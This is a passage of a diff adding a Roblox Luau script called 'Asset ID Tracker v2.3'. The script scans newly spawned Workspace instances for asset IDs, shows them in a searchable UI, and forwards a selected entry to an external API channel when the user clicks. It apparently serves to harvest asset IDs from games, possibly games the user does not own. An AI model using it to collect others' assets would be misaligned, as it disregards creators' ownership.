+		TextSize = 12, TextColor3 = THEME.Text,
+		TextXAlignment = Enum.TextXAlignment.Left,
+	}, hdr)
+	local countLabel = create("TextLabel", {
+		AnchorPoint = Vector2.new(1, 0), Position = UDim2.new(1, -10, 0, 0),
+		Size = UDim2.fromOffset(60, 30), BackgroundTransparency = 1,
+		Font = FONT_MONO, Text = "0", TextSize = 11,
+		TextColor3 = THEME.SubText,
+		TextXAlignment = Enum.TextXAlignment.Right,
+	}, hdr)
+
+	local body = create("Frame", {
+		Name = "FolderBody", Size = UDim2.new(1, 0, 0, 0),
+		AutomaticSize = Enum.AutomaticSize.Y, BackgroundTransparency = 1,
+		LayoutOrder = 1,
+	}, container)
+	create("UIListLayout", { Padding = UDim.new(0, 4), SortOrder = Enum.SortOrder.LayoutOrder }, body)
+
+	local f = {
+		container = container, header = hdr, body = body, arrow = arrow, dot = dot,
+		nameLabel = nameLabel, countLabel = countLabel,
+		entries = {}, count = 0, collapsed = false,
+	}
+	hdr.Activated:Connect(function()
+		f.collapsed = not f.collapsed
+		body.Visible = not f.collapsed
+		arrow.Text = f.collapsed and "▶" or "▼"
+	end)
+	hdr.MouseEnter:Connect(function()
+		TweenService:Create(hdr, TweenInfo.new(0.1), { BackgroundColor3 = THEME.Hover }):Play()
+	end)
+	hdr.MouseLeave:Connect(function()
+		TweenService:Create(hdr, TweenInfo.new(0.1), { BackgroundColor3 = THEME.PanelAlt }):Play()
+	end)
+
+	folders[className] = f
+	return f
+end
+
+-- ============================================================================
+--  SELECTION
+-- ============================================================================
+local selectedRecord = nil
+local function updateSendButton()
+	if selectedRecord then
+		setButtonColor(sendBtn, THEME.Accent)
+		sendBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+	else
+		setButtonColor(sendBtn, THEME.PanelAlt)
+		sendBtn.TextColor3 = THEME.SubText
+	end
+	sendBtn.Text = "📤"
+end
+local function selectEntry(record)
+	if selectedRecord and selectedRecord.setSelected then selectedRecord.setSelected(false) end
+	selectedRecord = record
+	if record and record.setSelected then record.setSelected(true) end
+	updateSendButton()
+	updateStats()
+end
+
+local allEntries = {}
+local totalFound = 0
+local entryCounter = 0
+
+function updateStats()
+	local visible = 0
+	for _, e in ipairs(allEntries) do
+		if e.frame and e.frame.Visible then visible += 1 end
+	end
+	local sel = selectedRecord and ("  •  Selected: " .. selectedRecord.data.name) or "  •  Selected: none"
+	statsLabel.Text = string.format("Found: %d   •   Shown: %d%s", totalFound, visible, sel)
+end
+
+local function removeEntry(record)
+	local folder = record.folder
+	if folder then
+		for i = #folder.entries, 1, -1 do
+			if folder.entries[i] == record then table.remove(folder.entries, i); break end
+		end
+		folder.count -= 1
+		folder.countLabel.Text = tostring(folder.count)
+		if folder.count <= 0 then
+			folder.container:Destroy()
+			folders[record.data.className] = nil
+		end
+	end
+	if record.frame then record.frame:Destroy() end
+end
+
+local function addEntry(data)
+	totalFound += 1
+	entryCounter += 1
+	local folder = getOrCreateFolder(data.className)
+
+	local row = create("TextButton", {
+		Name = "Entry", Size = UDim2.new(1, 0, 0, 58),
+		BackgroundColor3 = THEME.Panel, BorderSizePixel = 0,
+		AutoButtonColor = false, Text = "", LayoutOrder = entryCounter,
+	}, folder.body)
+	corner(8, row)
+	local rowStroke = stroke(THEME.Stroke, 1, 0.45, row)
+
+	local iconWrap = create("Frame", {
+		Position = UDim2.fromOffset(8, 8), Size = UDim2.fromOffset(30, 30),
+		BackgroundColor3 = data.color, BackgroundTransparency = 0.82,
+		BorderSizePixel = 0,
+	}, row)
+	corner(8, iconWrap)
+	create("TextLabel", {
+		Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1,
+		Font = FONT, Text = data.icon, TextSize = 16,
+		TextColor3 = Color3.fromRGB(255, 255, 255),
+	}, iconWrap)
+
+	create("TextLabel", {
+		Position = UDim2.fromOffset(46, 5), Size = UDim2.new(1, -160, 0, 15),
+		BackgroundTransparency = 1, Font = FONT_BOLD, TextSize = 13,
+		TextColor3 = THEME.Text, TextXAlignment = Enum.TextXAlignment.Left,
+		TextTruncate = Enum.TextTruncate.AtEnd, Text = data.name,
+	}, row)
+	create("TextLabel", {
+		Position = UDim2.fromOffset(46, 21), Size = UDim2.new(1, -160, 0, 13),
+		BackgroundTransparency = 1, Font = FONT, TextSize = 11,
+		TextColor3 = data.color, TextXAlignment = Enum.TextXAlignment.Left,
+		TextTruncate = Enum.TextTruncate.AtEnd,
+		Text = string.format("%s  •  %s.%s", data.label, data.className, data.prop),
+	}, row)
+	create("TextLabel", {
+		Position = UDim2.fromOffset(46, 35), Size = UDim2.new(1, -160, 0, 13),
+		BackgroundTransparency = 1, Font = FONT_MONO, TextSize = 10,
+		TextColor3 = THEME.SubText, TextXAlignment = Enum.TextXAlignment.Left,
+		TextTruncate = Enum.TextTruncate.AtEnd, Text = data.path,
+	}, row)
+
+	local idBtn = create("TextButton", {
+		Name = "CopyId", AnchorPoint = Vector2.new(1, 0),
+		Position = UDim2.new(1, -8, 0, 8), Size = UDim2.fromOffset(98, 22),
+		BackgroundColor3 = THEME.PanelAlt, BorderSizePixel = 0,
+		AutoButtonColor = false, Font = FONT_MONO, TextSize = 11,
+		TextColor3 = data.color, Text = data.id, ZIndex = 3,
+	}, row)
+	corner(6, idBtn); addHover(idBtn, THEME.PanelAlt, THEME.Hover)
+
+	create("TextLabel", {
+		AnchorPoint = Vector2.new(1, 0), Position = UDim2.new(1, -8, 0, 34),
+		Size = UDim2.fromOffset(98, 12), BackgroundTransparency = 1,
+		Font = FONT, TextSize = 10, TextColor3 = THEME.SubText,
+		TextXAlignment = Enum.TextXAlignment.Right, Text = data.time,
+	}, row)
+
+	local record = {
+		frame = row, data = data, folder = folder,
+		search = string.lower(table.concat({
+			data.name, data.id, data.className, data.prop, data.path, data.label,
+		}, " ")),
+	}
+	record.setSelected = function(sel)
+		if sel then
+			TweenService:Create(row, TweenInfo.new(0.1), { BackgroundColor3 = THEME.Hover }):Play()
+			TweenService:Create(rowStroke, TweenInfo.new(0.1), { Color = THEME.Accent, Transparency = 0 }):Play()
+		else
+			TweenService:Create(row, TweenInfo.new(0.1), { BackgroundColor3 = THEME.Panel }):Play()
+			TweenService:Create(rowStroke, TweenInfo.new(0.1), { Color = THEME.Stroke, Transparency = 0.45 }):Play()
+		end
+	end
+
+	table.insert(folder.entries, record)
+	table.insert(allEntries, record)
+	folder.count += 1
+	folder.countLabel.Text = tostring(folder.count)
+	folder.dot.BackgroundColor3 = data.color
+
+	-- ==========================================================
+	--  PRECISE CLICK — hover tracking (reliable)
+	-- ==========================================================
+	local hoveringIdBtn = false
+	idBtn.MouseEnter:Connect(function() hoveringIdBtn = true end)
+	idBtn.MouseLeave:Connect(function() hoveringIdBtn = false end)
+
+	row.Activated:Connect(function()
+		-- If the mouse was hovering the copy button, don't select.
+		if hoveringIdBtn then return end
+		selectEntry(record)
+	end)
+
+	row.MouseEnter:Connect(function()
+		if selectedRecord ~= record then
+			TweenService:Create(row, TweenInfo.new(0.12), { BackgroundColor3 = THEME.PanelAlt }):Play()
+			TweenService:Create(rowStroke, TweenInfo.new(0.12), { Color = data.color, Transparency = 0.5 }):Play()
+		end
+	end)
+	row.MouseLeave:Connect(function()
+		if selectedRecord ~= record then
+			TweenService:Create(row, TweenInfo.new(0.12), { BackgroundColor3 = THEME.Panel }):Play()
+			TweenService:Create(rowStroke, TweenInfo.new(0.12), { Color = THEME.Stroke, Transparency = 0.45 }):Play()
+		end
+	end)
+
+	idBtn.Activated:Connect(function()
+		copyText(data.id)
+		idBtn.Text = "✓ Copied"
+		task.delay(0.9, function()
+			if idBtn and idBtn.Parent then idBtn.Text = data.id end
+		end)
+	end)
+
+	while #allEntries > CONFIG.MaxEntries do
+		local old = table.remove(allEntries, 1)
+		if old == selectedRecord then selectedRecord = nil; updateSendButton() end
+		removeEntry(old)
+	end
+
+	updateStats()
+end
+
+-- Filter
+local filterText = ""
+local function applyFilter()
+	for _, folder in pairs(folders) do
+		local anyVisible = false
+		for _, e in ipairs(folder.entries) do
+			local match = filterText == "" or e.search:find(filterText, 1, true) ~= nil
+			e.frame.Visible = match
+			if match then anyVisible = true end
+		end
+		folder.container.Visible = anyVisible
+	end
+	updateStats()
+end
+searchBox:GetPropertyChangedSignal("Text"):Connect(function()
+	filterText = string.lower(searchBox.Text)
+	applyFilter()
+end)
+
+-- Scanner
+local scanned = setmetatable({}, { __mode = "k" })
+local paused = false
+
+local function collectFrom(inst, out)
+	if scanned[inst] then return end
+	scanned[inst] = true
+	local props = ASSET_PROPS[inst.ClassName]
+	if not props then return end
+	for _, prop in ipairs(props) do
+		local ok, value = pcall(function() return inst[prop] end)
+		if ok and type(value) == "string" and value ~= "" then
+			local id = extractId(value)
+			if id then table.insert(out, { instance = inst, prop = prop, id = id }) end
+		end
+	end
+end
+
+local function scanTree(root)
+	local out = {}
+	collectFrom(root, out)
+	local ok, desc = pcall(function() return root:GetDescendants() end)
+	if ok then
+		for _, d in ipairs(desc) do collectFrom(d, out) end
+	end
+	return out
+end
+
+local recentNotify = {}
+local lastNotifyTime = 0
+local function canNotifyId(id)
+	local now = os.clock()
+	local last = recentNotify[id]
+	if last and (now - last) < CONFIG.NotifyPerIdCooldown then return false end
+	recentNotify[id] = now
+	if #recentNotify > 500 then
+		local cutoff = now - CONFIG.NotifyPerIdCooldown
+		for k, v in pairs(recentNotify) do
+			if v < cutoff then recentNotify[k] = nil end
+		end
+	end
+	return true
+end
+local function canNotifyNow()
+	local now = os.clock()
+	if (now - lastNotifyTime) < CONFIG.NotifyMinGap then return false end
+	lastNotifyTime = now
+	return true
+end
+
+local function processFound(foundList)
+	local byInst, order = {}, {}
+	for _, info in ipairs(foundList) do
+		local inst = info.instance
+		if not byInst[inst] then byInst[inst] = {}; table.insert(order, inst) end
+		table.insert(byInst[inst], info)
+	end
+	for _, inst in ipairs(order) do
+		local infos = byInst[inst]
+		for _, info in ipairs(infos) do
+			local label, icon, color = describe(inst.ClassName, info.prop)
+			local d = {
+				id = info.id, prop = info.prop, className = inst.ClassName,
+				name = inst.Name, path = inst:GetFullName(),
+				label = label, icon = icon, color = color,
+				instance = inst, time = os.date("%H:%M:%S"),
+			}
+			addEntry(d)
+			if CONFIG.PrintToConsole then
+				print(string.format("[AssetTracker] %s | %s.%s = %s | %s",
+					d.name, d.className, d.prop, d.id, d.path))
+			end
+		end
+
+		if CONFIG.NotifyEnabled and not paused then
+			local first = infos[1]
+			if canNotifyId(first.id) and canNotifyNow() then
+				local label, icon = describe(inst.ClassName, first.prop)
+				local lines = {}
+				for i, info in ipairs(infos) do
+					if i > CONFIG.NotifyMaxPerSpawn then break end
+					table.insert(lines, info.id)
+				end
+				local extra = #infos - #lines
+				local text = inst.Name .. (extra > 0 and ("  (+" .. extra .. " more)") or "")
+				text = text .. "\n" .. table.concat(lines, ", ")
+				notify(icon .. " " .. label, text, 4)
+			end
+		end
+
+		if CONFIG.AutoHighlight then
+			highlightInstance(inst, CONFIG.HighlightDuration)
+		end
+	end
+end
+
+Workspace.DescendantAdded:Connect(function(descendant)
+	if paused then return end
+	if scanned[descendant] then return end
+	if CONFIG.IgnoreOwnCharacter then
+		local char = LP.Character
+		if char and descendant:IsDescendantOf(char) then return end
+	end
+	task.delay(CONFIG.ScanDelay, function()
+		if paused or not descendant or not descendant.Parent then return end
+		local found = scanTree(descendant)
+		if #found > 0 then processFound(found) end
+	end)
+end)
+
+-- Show / Hide
+local uiVisible = false
+local function setUIVisible(state)
+	uiVisible = state
+	if state then
+		main.Position = UDim2.fromOffset(toggleBtn.AbsolutePosition.X, toggleBtn.AbsolutePosition.Y)
+		main.Visible = true
+		toggleBtn.Visible = false
+	else
+		toggleBtn.Position = UDim2.fromOffset(main.AbsolutePosition.X, main.AbsolutePosition.Y)
+		main.Visible = false
+		toggleBtn.Visible = true
+	end
+end
+toggleBtn.Activated:Connect(function() setUIVisible(true) end)
+minimizeBtn.Activated:Connect(function() setUIVisible(false) end)
+
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+	if gameProcessed then return end
+	if input.KeyCode == CONFIG.ToggleKey then
+		setUIVisible(not uiVisible)
+	end
+end)
+
+-- Toolbar actions
+pauseBtn.Activated:Connect(function()
+	paused = not paused
+	if paused then
+		pauseBtn.Text = "▶"
+		setButtonColor(pauseBtn, THEME.Warn)
+		pauseBtn.TextColor3 = Color3.fromRGB(30, 25, 10)
+		statusLabel.Text = "❚❚ PAUSED"
+		statusLabel.TextColor3 = THEME.Warn
+	else
+		pauseBtn.Text = "⏸"
+		setButtonColor(pauseBtn, THEME.Panel)
+		pauseBtn.TextColor3 = THEME.Text
+		statusLabel.Text = "● TRACKING"
+		statusLabel.TextColor3 = THEME.Good
+	end
+end)
+
+clearBtn.Activated:Connect(function()
+	for _, f in pairs(folders) do f.container:Destroy() end
+	folders = {}; folderOrder = 0
+	allEntries = {}; totalFound = 0; entryCounter = 0
+	selectedRecord = nil
+	updateSendButton(); updateStats()
+end)
+
+local notifyOn = CONFIG.NotifyEnabled
+notifyBtn.Activated:Connect(function()
+	notifyOn = not notifyOn
+	CONFIG.NotifyEnabled = notifyOn
+	if notifyOn then
+		notifyBtn.Text = "🔔"
+		setButtonColor(notifyBtn, THEME.Panel)
+		notifyBtn.TextColor3 = THEME.Text
+	else
+		notifyBtn.Text = "🔕"
+		setButtonColor(notifyBtn, THEME.PanelAlt)
+		notifyBtn.TextColor3 = THEME.SubText
+	end
+end)
+
+local highlightOn = CONFIG.AutoHighlight
+highlightBtn.Activated:Connect(function()
+	highlightOn = not highlightOn
+	CONFIG.AutoHighlight = highlightOn
+	if highlightOn then
+		highlightBtn.Text = "🎯"
+		setButtonColor(highlightBtn, THEME.Panel)
+		highlightBtn.TextColor3 = THEME.Text
+	else
+		highlightBtn.Text = "🚫"
+		setButtonColor(highlightBtn, THEME.PanelAlt)
+		highlightBtn.TextColor3 = THEME.SubText
+	end
+end)
+
+sendBtn.Activated:Connect(function()
+	if not selectedRecord then
+		notify("⚠️ No selection", "Click an entry first, then hit 📤.")
+		return
+	end
+	local d = selectedRecord.data
+	local title = string.format("%s %s Found", d.icon, d.label)
+	local message = string.format(
+		"Name: %s\nClass: %s\nProperty: %s\nID: %s\nPath: %s\nTime: %s",
+		d.name, d.className, d.prop, d.id, d.path, d.time
+	)
+	sendBtn.Text = "⏳"
+	sendBtn.TextColor3 = THEME.Warn
+	task.spawn(function()
+		local ok, resp = postToApi(title, message)
+		if ok then
+			sendBtn.Text = "✓"
+			sendBtn.TextColor3 = THEME.Good
+			notify("✅ Sent", "Forwarded to channel: " .. API.Channel, 3)
+		else
+			sendBtn.Text = "✕"
+			sendBtn.TextColor3 = THEME.Danger
+			notify("❌ Send failed", tostring(resp and resp.StatusMessage or resp), 5)
+			warn("[AssetTracker] POST failed:", resp)
+		end
+		task.wait(1.2)
+		if sendBtn and sendBtn.Parent then
+			sendBtn.Text = "📤"
+			sendBtn.TextColor3 = selectedRecord and Color3.fromRGB(255,255,255) or THEME.SubText
+		end
+	end)
+end)
+
+closeBtn.Activated:Connect(function()
+	pcall(function() screen:Destroy() end)
+	print("[AssetTracker] UI closed.")
+end)
+
+if CONFIG.StartHidden then
+	uiVisible = false
+	main.Visible = false
+	toggleBtn.Visible = true
+else
+	setUIVisible(true)
+end
+
+updateSendButton()
+updateStats()
+applyFilter()
+
+print("╔══════════════════════════════════════════╗")
+print("║   ASSET ID TRACKER v2.3  —  LOADED       ║")
+print("║   Click 🔍 bubble (or RightShift) to open║")
+print("╚══════════════════════════════════════════╝")
